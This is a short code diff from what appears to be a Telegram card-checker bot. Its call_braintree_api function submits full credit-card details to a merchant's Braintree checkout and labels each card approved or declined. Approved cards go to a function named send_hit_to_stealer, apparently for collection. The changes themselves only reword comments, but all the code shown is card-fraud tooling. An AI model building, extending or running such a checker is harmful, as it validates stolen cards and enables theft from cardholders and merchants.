@@ -356,7 +356,7 @@ async def call_braintree_api(fullcc):
             
             checkout_resp = await session.post(step4_url, headers=checkout_headers, data=post_data, timeout=30)
             
-            # Extract response message from site
+            # Extract response message using original functions
             msg = extract_jdialog_message(checkout_resp.text)
             if not msg:
                 msg = extract_error_message(checkout_resp.text)
@@ -365,7 +365,7 @@ async def call_braintree_api(fullcc):
             if not msg:
                 msg = "No response from server"
             
-            # Determine status based on message content
+            # Determine status
             if "approved" in msg.lower() or "charged" in msg.lower() or "success" in msg.lower():
                 return "Approved ✅", msg[:50], GATE_NAME, "0s"
             elif "decline" in msg.lower() or "declined" in msg.lower():
@@ -445,7 +445,7 @@ async def braintree_cmd(Client, message):
         if "Approved" in status or "✅" in status:
             await send_hit_to_stealer(Client, fullcc, status, response, gateway, time.perf_counter() - start, first_name, role)
 
-        # Make status bold and remove owner line
+        # Make status bold, remove owner line, clickable checked by
         display_status = f"<b>{status}</b>"
 
         finalresp = f"""{display_status}
